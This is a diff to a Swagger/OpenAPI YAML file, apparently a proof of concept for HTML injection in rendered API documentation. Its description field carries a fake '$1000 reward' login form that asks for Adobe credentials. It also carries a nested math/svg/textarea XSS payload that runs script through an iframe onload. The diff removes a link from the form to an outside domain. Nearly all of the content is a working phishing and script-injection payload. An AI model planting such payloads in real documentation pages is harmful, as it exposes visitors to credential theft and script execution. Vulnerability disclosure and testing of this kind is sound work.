@@ -4,5 +4,5 @@ info:
   title: Rajnish Swagger HTML injection (ONLY FOR POC)
   description:
     <h1>GET 1000$ FREE REWARD IN SECONDS TO YOUR BANK ACCOUNT, LOGIN BELOW WITH YOUR ADOBE CREDENTIALS</h1>
-    <form><label><input id="textbox" type="text" placeholder="EMAIL" style="width:320px;height=30px"></label><br><label><input  id="textbox" type="text" placeholder="PASSWORD" style="width:320px"></label><br><a href="https://dreamereh.ml/"><input type="submit" value="SIGN IN" onclick="msg()"></a></form>
+    <form><label><input id="textbox" type="text" placeholder="EMAIL" style="width:320px;height=30px"></label><br><label><input  id="textbox" type="text" placeholder="PASSWORD" style="width:320px"></label><br><input type="submit" value="SIGN IN" onclick="msg()"></form>
     <BR><math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
